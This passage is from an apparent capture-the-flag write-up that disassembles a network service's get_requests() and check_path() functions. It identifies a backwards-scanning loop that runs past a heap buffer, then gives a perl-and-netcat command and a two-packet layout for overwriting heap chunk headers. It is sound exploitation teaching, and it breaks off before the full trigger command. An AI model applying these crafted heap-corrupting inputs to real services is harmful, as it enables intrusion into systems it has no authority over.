<span class="mh">0x0804bd74</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">45</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
</code></pre></div>


<p>Next, allocate 128 bytes on the heap.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd77</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd7a</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">51</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">edx</span>
<span class="mh">0x0804bd7d</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="o">-</span><span class="mh">0x414</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
<span class="mh">0x0804bd84</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;:</span>	  <span class="n">addl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
</code></pre></div>


<p>This snippets takes care of the loop.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd88</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">nbyte</span> <span class="o">=</span> <span class="mi">128</span>
<span class="mh">0x0804bd90</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd93</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">pass</span> <span class="n">buf</span>
<span class="mh">0x0804bd97</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span>
<span class="mh">0x0804bd9a</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>            <span class="p">;</span> <span class="n">pass</span> <span class="kt">FILE</span>
<span class="mh">0x0804bd9d</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;:</span>	  <span class="n">call</span>   <span class="mh">0x8048e5c</span> <span class="o">&lt;</span><span class="n">read</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>


<p>Next, read 128 bytes into the allocated buffer.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bda2</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;:</span>	  <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x80</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bda7</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;:</span>	  <span class="n">jne</span>    <span class="mh">0x804bdde</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">151</span><span class="o">&gt;</span>
</code></pre></div>


<p>Check whether 128 bytes were read with the last command.
This is probably a break condition.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bda9</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">4</span>
<span class="mh">0x0804bdb1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">106</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804c2d1</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>   <span class="p">;</span> <span class="n">pass</span> <span class="n">s2</span> <span class="o">=</span> <span class="s">&quot;FSRD&quot;</span>
<span class="mh">0x0804bdb9</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">114</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bdbc</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>            <span class="p">;</span> <span class="n">pass</span> <span class="n">s1</span>
<span class="mh">0x0804bdbf</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048fdc</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804bdc4</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bdc6</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x804bde1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;</span>
</code></pre></div>


<p>Compare the input against a global variable.
If the string is not found at the beginning, do a jump to the end of the loop.
This is probably a break condition.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bdc8</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bdcb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bdce</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804bdd1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x804bcd0</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">&gt;</span>
<span class="mh">0x0804bdd6</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x804bd57</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>
<span class="mh">0x0804bddb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">nop</span>
<span class="mh">0x0804bddc</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x804bde2</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">155</span><span class="o">&gt;</span>
<span class="mh">0x0804bdde</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">151</span><span class="o">&gt;:</span>	<span class="n">nop</span>
<span class="mh">0x0804bddf</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">152</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x804bde2</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">155</span><span class="o">&gt;</span>
<span class="mh">0x0804bde1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;:</span>	<span class="n">nop</span>
<span class="mh">0x0804bde2</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">155</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bde9</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">162</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x804be1c</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">213</span><span class="o">&gt;</span>
</code></pre></div>


<p>Don&rsquo;t know exactly what&rsquo;s happening here.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bdeb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">164</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>          <span class="p">;</span> <span class="n">pass</span> <span class="n">nbyte</span> <span class="o">=</span> <span class="mi">11</span>
<span class="mh">0x0804bdf3</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804c2d6</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>    <span class="p">;</span> <span class="n">pass</span> <span class="n">buf</span> <span class="o">=</span> <span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0x0804bdfb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">180</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bdfe</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">183</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>             <span class="p">;</span> <span class="n">pass</span> <span class="kt">FILE</span>
<span class="mh">0x0804be01</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">186</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804be06</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">191</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be09</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">194</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0x414</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be10</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">201</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>             <span class="p">;</span> <span class="n">pass</span> <span class="n">ptr</span>
<span class="mh">0x0804be13</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">204</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x804a9c2</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
<span class="mh">0x0804be18</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">209</span><span class="o">&gt;:</span>	<span class="n">addl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
</code></pre></div>


<p>This terminates the loop and cleans up the allocated memory.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804be1c</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">213</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be1f</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">216</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be22</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">219</span><span class="o">&gt;:</span>	<span class="n">jl</span>     <span class="mh">0x804bdeb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">164</span><span class="o">&gt;</span>
</code></pre></div>


<p>And another loop condition at the end.
Let&rsquo;s take a look at the check_path() function.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bcd3</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	  <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804bcd6</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span> 	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>          <span class="p">;</span> <span class="n">pass</span> <span class="n">c</span> <span class="o">=</span> <span class="s">&quot;/&quot;</span>
<span class="mh">0x0804bcde</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bce1</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>              <span class="p">;</span> <span class="n">pass</span> <span class="o">*</span><span class="n">s</span>
<span class="mh">0x0804bce4</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;:</span>	  <span class="n">call</span>   <span class="mh">0x8048f7c</span> <span class="o">&lt;</span><span class="n">rindex</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804bce9</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">ptr</span> <span class="n">to</span> <span class="n">last</span> <span class="n">occurrence</span>
</code></pre></div>


<p>The last occurence of 0x2F is identified.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bcec</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bcef</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>              <span class="p">;</span> <span class="n">pass</span> <span class="o">*</span><span class="n">s</span>
<span class="mh">0x0804bcf2</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;:</span>	  <span class="n">call</span>   <span class="mh">0x8048edc</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804bcf7</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">39</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>          <span class="p">;</span> <span class="n">no</span> <span class="n">of</span> <span class="n">bytes</span>
<span class="mh">0x0804bcfa</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">42</span><span class="o">&gt;:</span>	  <span class="n">cmpl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bcfe</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>	  <span class="n">je</span>     <span class="mh">0x804bd45</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;</span>
</code></pre></div>


<p>With the rindex of slash, the length of the remaining string is calculated.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd00</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804c2cc</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">pass</span> <span class="n">needle</span> <span class="o">=</span> <span class="s">&quot;ROOT&quot;</span>
<span class="mh">0x0804bd08</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd0b</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>              <span class="p">;</span> <span class="n">pass</span> <span class="n">haystack</span>
<span class="mh">0x0804bd0e</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;:</span>	  <span class="n">call</span>   <span class="mh">0x8048f4c</span> <span class="o">&lt;</span><span class="n">strstr</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804bd13</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bd16</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;:</span>	  <span class="n">cmpl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bd1a</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;:</span>	  <span class="n">je</span>     <span class="mh">0x804bd45</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;</span>
</code></pre></div>


<p>Find the needle &ldquo;ROOT&rdquo; in the last part of the string.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd1c</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>	  <span class="n">jmp</span>    <span class="mh">0x804bd22</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">82</span><span class="o">&gt;</span>
<span class="mh">0x0804bd1e</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;:</span>	  <span class="n">subl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bd22</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">82</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd25</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;:</span>	  <span class="n">movzbl</span> <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd28</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;:</span>	  <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x2f</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
<span class="mh">0x0804bd2a</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;:</span>	  <span class="n">jne</span>    <span class="mh">0x804bd1e</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span>
</code></pre></div>


<p>This iterates a pointer backwards from &ldquo;ROOT&rdquo; to locate the first occurence of 0x2F &ldquo;/&rdquo;.
There might be a problem with this loop, as the pointer will iterate out of the current variable into other memory on the heap.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd2c</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd2f</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">95</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>           <span class="p">;</span> <span class="n">pass</span> <span class="n">size</span>
<span class="mh">0x0804bd33</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd36</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>           <span class="p">;</span> <span class="n">pass</span> <span class="n">src</span>
<span class="mh">0x0804bd3a</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">106</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804bd3d</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>              <span class="p">;</span> <span class="n">pass</span> <span class="n">dest</span>
<span class="mh">0x0804bd40</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048f8c</span> <span class="o">&lt;</span><span class="n">memmove</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804bd45</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
</code></pre></div>


<p>So with the following command we can trigger the memmove() at 0x0804bd40.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span>perl -e <span class="s1">&#39;print(&quot;FSRD/ROOT&quot;.&quot;A&quot;x64 .&quot;C&quot;x64 .&quot;\r\n&quot;)&#39;</span> <span class="p">|</span> nc 192.168.1.6 2993
</code></pre></div>


<p>Also notice, that the services reads 128 bytes in a newly allocated buffer in a loop.
Only when less than 128 bytes are received, or the string &ldquo;FSRD&rdquo; is not at the beginning of the string does the service close the connection.
This means, that we can send sequential requests that will end up next to each other on the heap.
At this point the reverse search for 0x2F in check_path:88 and memmove comes in handy.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>By sending two specifically crafted requests we might be able overwrite the chunk size and prev_size for the second allocated memory chunk.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">       packet #1                  packet #2</span>
<span class="go">+---+--------------------+------------------------+</span>
<span class="go">|hdr|FSRDAAAA...AAAAAAAA/|hdr|FSRDROOT...AAAA/BBBB|</span>
<span class="go">+---+--------------------+------------------------+</span>
<span class="go">                       /|\                    \  /</span>
<span class="go">                        |      memmove()       ||</span>
<span class="go">                        +----------------------++</span>
</code></pre></div>


<p>The command to trigger the write looks as follows.</p>

